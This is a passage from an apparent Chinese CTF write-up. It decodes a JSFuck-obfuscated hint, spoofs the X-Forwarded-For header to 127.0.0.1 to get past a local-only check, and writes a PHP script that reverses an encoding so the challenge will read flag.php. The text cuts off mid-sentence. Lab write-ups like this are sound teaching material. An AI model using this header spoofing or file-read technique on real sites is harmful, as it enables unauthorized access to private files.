class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>((+((+(+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>)+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>)+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>)+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>)()())<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(+(!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>))<span class="hljs-comment">[(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span><span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+((+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>]</span>(!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>)+(<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>]</span>]</span>()<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>+(<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>+(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>]</span>]</span>)<span class="hljs-comment">[!+<span class="hljs-comment">[]</span>+!+<span class="hljs-comment">[]</span>+<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>]</span>)<br>--&gt;<br></code></pre></td></tr></table></figure><p>查了下这东西叫<code>jsfuck</code>编码，可以用<code>[CTF在线工具-在线JSfuck加密|在线JSfuck解密|JSfuck|JSfuck原理|JSfuck算法 (hiencode.com)](http://www.hiencode.com/jsfuck.html)</code>解码(我看其它师傅都是直接丢到控制台里运行)。</p><p>解码后是<code>alert(&quot;post me Merak&quot;))</code>，<code>POST</code>随便传个值：<code>Merak=333</code>，同时修改<code>X-Forwarded-For: 127.0.0.1</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs PHP">Flag is here~But how to get it? <span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;takeip.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Merak&#x27;</span>]))&#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br>    <span class="hljs-keyword">die</span>(); <br>&#125; <br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123; <br>    <span class="hljs-variable">$v</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$v</span>); <br>    <span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>; <br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$v</span>);<span class="hljs-variable">$i</span>++)&#123; <br>        <span class="hljs-variable">$re</span> .= <span class="hljs-title function_ invoke__">chr</span> ( <span class="hljs-title function_ invoke__">ord</span> (<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) + <span class="hljs-variable">$i</span>*<span class="hljs-number">2</span> ); <span class="hljs-comment">//ord返回ASCII值，chr返回对应的ASCII字符</span><br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$re</span>; <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Local access only!&#x27;</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">getIp</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span>!=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="hljs-variable">$ip</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span> === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;2333&#x27;</span>]) === <span class="hljs-string">&#x27;todat is a happy day&#x27;</span> )&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your REQUEST is:&quot;</span>.<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])); &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>我们的目标是<code>flag.php</code>,<code>/?file</code>的值经过了简单的加密过程，逆着回去就行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$v</span> = <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dechange</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123;<br><span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$v</span>); <span class="hljs-variable">$i</span>++)&#123;<br><span class="hljs-variable">$re</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) - <span class="hljs-variable">$i</span> * <span class="hljs-number">2</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$re</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">dechange</span>(<span class="hljs-variable">$v</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//ZmpdYSZmXGI=</span><br></code></pre></td></tr></table></figure><p>所以给<code>file</code>赋值<code>ZmpdYSZmXGI=</code>，注意要求<code>file_get_contents($_GET[&#39;2333&#39;]) === &#39;todat is a happy 